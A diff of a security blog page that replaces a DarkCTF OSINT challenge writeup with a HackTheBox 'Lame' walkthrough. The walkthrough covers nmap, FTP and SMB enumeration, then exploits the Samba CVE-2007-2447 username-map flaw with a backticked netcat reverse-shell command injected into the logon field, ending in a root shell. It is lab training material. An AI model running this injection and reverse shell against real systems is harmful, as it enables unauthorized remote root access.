@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DarkCTF Official Writeup - Dark Social Web, CTF, OSCP, Cyber Security, Blockchain">
+    <meta name="keywords" content="Lame HTB Writeup, CTF, OSCP, Cyber Security, Blockchain">
     <meta name="description" content="Mukhilan Pari Personal Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>DarkCTF Official Writeup - Dark Social Web | Mukhilan</title>
+    <title>Lame HTB Writeup | Mukhilan</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/writeups/darkctf/darkkkk-nobg.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/writeups/HTB/Lame/Lame.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DarkCTF Official Writeup - Dark Social Web</h1>
+                    <h1 class="description center-align post-title">Lame HTB Writeup</h1>
                 </div>
             </div>
         </div>
@@ -446,20 +446,20 @@
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/OSCP/">
+                                <span class="chip bg-color">OSCP</span>
+                            </a>
+                        
+                            <a href="/tags/Notes/">
+                                <span class="chip bg-color">Notes</span>
+                            </a>
+                        
                             <a href="/tags/Writeups/">
                                 <span class="chip bg-color">Writeups</span>
                             </a>
                         
-                            <a href="/tags/DarkCTF/">
-                                <span class="chip bg-color">DarkCTF</span>
-                            </a>
-                        
-                            <a href="/tags/DarkArmy/">
-                                <span class="chip bg-color">DarkArmy</span>
-                            </a>
-                        
-                            <a href="/tags/Osint/">
-                                <span class="chip bg-color">Osint</span>
+                            <a href="/tags/HTB/">
+                                <span class="chip bg-color">HTB</span>
                             </a>
                         
                     </div>
@@ -483,28 +483,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-10-01
+                    2021-06-14
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-06-10
+                    2021-06-14
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    240
+                    964
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    1 Min
+                    6 Min
                 </div>
                 
 
@@ -519,29 +519,167 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Dark-Social-Web"><a href="#Dark-Social-Web" class="headerlink" title="Dark Social Web"></a>Dark Social Web</h1><blockquote>
-<p>Points: <code>472</code></p>
-</blockquote>
+                <h1 id="Lame-HTB"><a href="#Lame-HTB" class="headerlink" title="Lame - HTB"></a>Lame - HTB</h1><p><img src="/medias/writeups/HTB/Lame/Lame-desc.png" alt="Lame HTB"></p>
+<p>Changed HTB Lame original IP address to <code>192.168.10.10</code></p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul>
+<li>-p- –&gt; to scan ports from 1 through 65535</li>
+<li>-sV –&gt; Version detection</li>
+<li>-sC –&gt; script scan using the default set of scripts =&gt; equivalent to –script=default</li>
+<li>-A –&gt; Aggressive scan options</li>
+<li>–min-rate 1000 –&gt; 1000 packets per second</li>
+<li>–max-retries 5 –&gt; number of times a packet is to be resent on a port to check</li>
+<li>-Pn - skip host discovery</li>
+</ul>
+<pre class=" language-bash"><code class="language-bash">
+nmap -p- -sV -sC -A -Pn --min-rate 1000 --max-retries 5 192.168.10.10
+Host discovery disabled <span class="token punctuation">(</span>-Pn<span class="token punctuation">)</span>. All addresses will be marked <span class="token string">'up'</span> and scan <span class="token function">times</span> will be slower.
+Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-13 18:14 UTC
+Nmap scan report <span class="token keyword">for</span> 10.129.160.68
+Host is up <span class="token punctuation">(</span>0.15s latency<span class="token punctuation">)</span>.
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE     VERSION
+21/tcp   <span class="token function">open</span>  <span class="token function">ftp</span>         vsftpd 2.3.4
+<span class="token operator">|</span>_ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code 230<span class="token punctuation">)</span>
+<span class="token operator">|</span> ftp-syst: 
+<span class="token operator">|</span>   STAT: 
+<span class="token operator">|</span> FTP server status:
+<span class="token operator">|</span>      Connected to 192.168.10.5
+<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
+<span class="token operator">|</span>      TYPE: ASCII
+<span class="token operator">|</span>      No session bandwidth limit
+<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is 300
+<span class="token operator">|</span>      Control connection is plain text
+<span class="token operator">|</span>      Data connections will be plain text
+<span class="token operator">|</span>      vsFTPd 2.3.4 - secure, fast, stable
+<span class="token operator">|</span>_End of status
+22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH 4.7p1 Debian 8ubuntu1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+139/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.X - 4.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+445/tcp  <span class="token function">open</span>  netbios-ssn Samba smbd 3.0.20-Debian <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
+3632/tcp <span class="token function">open</span>  distccd     distccd v1 <span class="token variable"><span class="token punctuation">((</span>GNU<span class="token punctuation">)</span> <span class="token number">4.2</span>.<span class="token number">4</span> <span class="token punctuation">(</span>Ubuntu <span class="token number">4.2</span>.<span class="token number">4</span><span class="token operator">-</span>1ubuntu4<span class="token punctuation">))</span></span>
+Service Info: OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+<span class="token operator">|</span>_clock-skew: mean: 2h00m37s, deviation: 2h49m46s, median: 34s
+<span class="token operator">|</span> smb-os-discovery: 
+<span class="token operator">|</span>   OS: Unix <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">)</span>
+<span class="token operator">|</span>   Computer name: lame
+<span class="token operator">|</span>   NetBIOS computer name: 
+<span class="token operator">|</span>   Domain name: hackthebox.gr
+<span class="token operator">|</span>   FQDN: lame.hackthebox.gr
+<span class="token operator">|</span>_  System time: 2021-06-13T14:17:33-04:00
+<span class="token operator">|</span> smb-security-mode: 
+<span class="token operator">|</span>   account_used: guest
+<span class="token operator">|</span>   authentication_level: user
+<span class="token operator">|</span>   challenge_response: supported
+<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span>
+<span class="token operator">|</span>_smb2-time: Protocol negotiation failed <span class="token punctuation">(</span>SMB2<span class="token punctuation">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 184.79 seconds
+</code></pre>
+<p>FTP and Samba looks interesting. </p>
+<h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><p>Searching samba 3.0.20 gives a metasploit script(16320.rb), Lets explore without using metasploit. </p>
+<pre class=" language-bash"><code class="language-bash">searchsploit samba 3.0.20
+---------------------------------------------- ---------------------------------
+ Exploit Title                                <span class="token operator">|</span>  Path
+---------------------------------------------- ---------------------------------
+Samba 3.0.10 <span class="token operator">&lt;</span> 3.3.5 - Format String / Securi <span class="token operator">|</span> multiple/remote/10095.txt
+Samba 3.0.20 <span class="token operator">&lt;</span> 3.0.25rc3 - <span class="token string">'Username'</span> map scr <span class="token operator">|</span> unix/remote/16320.rb
+Samba <span class="token operator">&lt;</span> 3.0.20 - Remote Heap Overflow         <span class="token operator">|</span> linux/remote/7701.txt
+Samba <span class="token operator">&lt;</span> 3.0.20 - Remote Heap Overflow         <span class="token operator">|</span> linux/remote/7701.txt
+Samba <span class="token operator">&lt;</span> 3.6.2 <span class="token punctuation">(</span>x86<span class="token punctuation">)</span> - Denial of Service <span class="token punctuation">(</span>PoC<span class="token punctuation">)</span> <span class="token operator">|</span> linux_x86/dos/36741.py
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p><code>anonymous:anonymous</code> FTP Credential worked but cant able to access files.</p>
+<pre><code>ftp 192.168.10.10
+Connected to 192.168.10.10.
+220 (vsFTPd 2.3.4)
+Name (192.168.10.10:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp&gt;</code></pre>
+<h2 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h2><p>Got Protocol negotiation failed error.</p>
+<pre><code>sudo smbclient -L 192.168.10.10
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED</code></pre>
+<p>To improve security, the NT LAN manager version 1 (NTLMv1) protocol is now disabled by default.</p>
+<p>To Enable - Steps as below:</p>
 <blockquote>
-<p>Author: <code>Catamob, Whitewolf</code></p>
+<p>sudo vi /etc/samba/smb.conf</p>
 </blockquote>
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>0xDarkArmy has 1 social account, and DarkArmy uses the same name everywhere. Hint: The front page of internet<br>Hint: the front page of the internet<br>flag format: darkctf{}</p>
+<p>Add the following settings under “GLOBAL”:  </p>
+<blockquote>
+<p>client min protocol = CORE<br>client max protocol = SMB3</p>
 </blockquote>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We already have accounts on Twitter and Instagram with the same username for a long time. But we didn’t advertise Reddit and the one community with r/0xDarkArmy and user account with u/0xDarkArmy.</p>
-<p>People who don’t know our Reddit account can be found from the hint that the Reddit’s slogan is “The Front page of the internet”.</p>
-<p>Alternative:<br><a target="_blank" rel="noopener" href="https://github.com/sherlock-project/sherlock">https://github.com/sherlock-project/sherlock</a></p>
-<pre class=" language-python"><code class="language-python">python3 sherlock 0xDarkArmy</code></pre>
-<p>Sherlock will give you the intended result of social media accounts.</p>
-<p>In r/0xDarkArmy, there is a pinned post as below, </p>
-<p><img src="/medias/writeups/darkctf/social1.png" alt="Social 1"></p>
-<p>0xDarkArmy’s comment saying DarkSecret in the profile, One post in u/0xDarkArmy says spoiler contains and it contains the QR code to a .onion website.</p>
-<p><img src="/medias/writeups/darkctf/social2.png" alt="Social 2"></p>
-<p>Tor is needed for opening .onion sites, in that 1st part of the flag is in robots.txt and 2nd part of the flag is in the request body as flag header,</p>
-<p><img src="/medias/writeups/darkctf/social3.png" alt="Social 2"></p>
-<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote>
-<p>darkctf{S0c1a1_D04k_w3b_051n7}</p>
+<p>Now, smbclient can interact.</p>
+<ul>
+<li>-L: lists the services</li>
+</ul>
+<pre class=" language-bash"><code class="language-bash">smbclient -L 192.168.10.10
+
+Enter WORKGROUP\htb-mukhilan's password: 
+Anonymous login successful
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    tmp             Disk      oh noes<span class="token operator">!</span>
+    opt             Disk      
+    IPC$            IPC       IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span>
+    ADMIN$          IPC       IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span>
+Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.
+Anonymous login successful
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    WORKGROUP            LAME</code></pre>
+<p>By seeing the permissions on the share drives, tmp folder allows Read &amp; Write access.</p>
+<pre class=" language-bash"><code class="language-bash">smbmap -H 192.168.10.10
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: 192.168.10.10:445    Name: 192.168.10.10
+
+        Disk                                                      Permissions    Comment
+    ----                                                      -----------    -------
+    print$                                                NO ACCESS    Printer Drivers
+    tmp                                                   READ, WRITE    oh noes<span class="token operator">!</span>
+    opt                                                   NO ACCESS    
+    IPC$                                                  NO ACCESS    IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span>
+    ADMIN$                                                NO ACCESS    IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span></code></pre>
+<h2 id="CVE-2007-2447-Exploit"><a href="#CVE-2007-2447-Exploit" class="headerlink" title="CVE-2007-2447 Exploit"></a>CVE-2007-2447 Exploit</h2><p>From the Enumeration samba 3.0.20 have metasploit script with CVE-2007-2447 - ‘Username’ map script’ Command Execution.</p>
+<p>By reading the metasploit script( CVE-2007-2447 ),</p>
+<blockquote>
+<p>username = “/=<code>nohup " + payload.encoded + "</code>“</p>
 </blockquote>
+<p>The issue is in username field. The payload is replaced in <code>payload.encoded</code> as below,</p>
+<blockquote>
+<p>nohup nc -nv 192.168.10.10 4444 -e /bin/sh</p>
+</blockquote>
+<pre class=" language-bash"><code class="language-bash">smbclient //192.168.10.10/tmp
+Enter WORKGROUP\htb-mukhilan's password: 
+Anonymous login successful
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: \<span class="token operator">></span> logon <span class="token string">"/=<span class="token variable"><span class="token variable">`</span><span class="token function">nohup</span> nc -nv 192.168.10.5 4444 -e /bin/sh<span class="token variable">`</span></span>"</span>
+Password: 
+</code></pre>
+<p>Got the root shell.</p>
+<pre class=" language-bash"><code class="language-bash">nc -lvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 192.168.10.10 59960
+
+<span class="token function">whoami</span>
+root</code></pre>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/16320">https://www.exploit-db.com/exploits/16320</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -585,7 +723,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mukhilan.com/Writeups/darkctf-official-dark-social-web/">http://mukhilan.com/Writeups/darkctf-official-dark-social-web/</a>
+                    <a href="http://mukhilan.com/Writeups/Lame-HTB-writeup/">http://mukhilan.com/Writeups/Lame-HTB-writeup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -623,20 +761,20 @@
                     
                         <div class="article-tag">
                             
+                                <a href="/tags/OSCP/">
+                                    <span class="chip bg-color">OSCP</span>
+                                </a>
+                            
+                                <a href="/tags/Notes/">
+                                    <span class="chip bg-color">Notes</span>
+                                </a>
+                            
                                 <a href="/tags/Writeups/">
                                     <span class="chip bg-color">Writeups</span>
                                 </a>
                             
-                                <a href="/tags/DarkCTF/">
-                                    <span class="chip bg-color">DarkCTF</span>
-                                </a>
-                            
-                                <a href="/tags/DarkArmy/">
-                                    <span class="chip bg-color">DarkArmy</span>
-                                </a>
-                            
-                                <a href="/tags/Osint/">
-                                    <span class="chip bg-color">Osint</span>
+                                <a href="/tags/HTB/">
+                                    <span class="chip bg-color">HTB</span>
                                 </a>
                             
                         </div>
@@ -681,7 +819,7 @@
         repo: 'mukhilanpari.github.io',
         owner: 'mukhilanpari',
         admin: "mukhilanpari",
-        id: '2020-10-01T20-12-05',
+        id: '2021-06-14T02-11-20',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -705,28 +843,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/Writeups/darkctf-official-chain-race/">
+                <a href="/Writeups/Lame-HTB-writeup/">
                     <div class="card-image">
                         
-                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Chain Race">
+                        <img src="/medias/writeups/HTB/Lame/Lame.png" class="responsive-img" alt="Lame HTB Writeup">
                         
-                        <span class="card-title">DarkCTF Official Writeup - Chain Race</span>
+                        <span class="card-title">Lame HTB Writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DarkCTF conducted by DarkArmy Official Writeup of Chain Race challenge
+                            My Notes - Lame HackTheBox Writeup
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -739,23 +878,24 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
+                    
+                    <a href="/tags/OSCP/">
+                        <span class="chip bg-color">OSCP</span>
+                    </a>
+                    
+                    <a href="/tags/Notes/">
+                        <span class="chip bg-color">Notes</span>
+                    </a>
                     
                     <a href="/tags/Writeups/">
                         <span class="chip bg-color">Writeups</span>
                     </a>
                     
-                    <a href="/tags/DarkCTF/">
-                        <span class="chip bg-color">DarkCTF</span>
-                    </a>
-                    
-                    <a href="/tags/DarkArmy/">
-                        <span class="chip bg-color">DarkArmy</span>
-                    </a>
-                    
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/HTB/">
+                        <span class="chip bg-color">HTB</span>
                     </a>
                     
                 </div>
@@ -769,23 +909,23 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/Writeups/darkctf-official-secret-contract/">
+                <a href="/Writeups/Kioptrix-Level-1/">
                     <div class="card-image">
                         
-                        <img src="/medias/writeups/darkctf/darkkkk-nobg.png" class="responsive-img" alt="DarkCTF Official Writeup - Secret of the Contract">
+                        <img src="/medias/writeups/kioptrix/Kioptrix.png" class="responsive-img" alt="Kioptrix Level 1 Writeup">
                         
-                        <span class="card-title">DarkCTF Official Writeup - Secret of the Contract</span>
+                        <span class="card-title">Kioptrix Level 1 Writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DarkCTF conducted by DarkArmy Official Writeup of Secret of the Contract challenge
+                            My Notes - Kioptrix Level 1 Writeup
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-10
                             </span>
                         <span class="publish-author">
                             
@@ -802,20 +942,20 @@
                 
                 <div class="card-action article-tags">
                     
+                    <a href="/tags/OSCP/">
+                        <span class="chip bg-color">OSCP</span>
+                    </a>
+                    
+                    <a href="/tags/Notes/">
+                        <span class="chip bg-color">Notes</span>
+                    </a>
+                    
+                    <a href="/tags/VulnHub/">
+                        <span class="chip bg-color">VulnHub</span>
+                    </a>
+                    
                     <a href="/tags/Writeups/">
                         <span class="chip bg-color">Writeups</span>
-                    </a>
-                    
-                    <a href="/tags/DarkCTF/">
-                        <span class="chip bg-color">DarkCTF</span>
-                    </a>
-                    
-                    <a href="/tags/DarkArmy/">
-                        <span class="chip bg-color">DarkArmy</span>
-                    </a>
-                    
-                    <a href="/tags/blockchain/">
-                        <span class="chip bg-color">blockchain</span>
                     </a>
                     
                 </div>
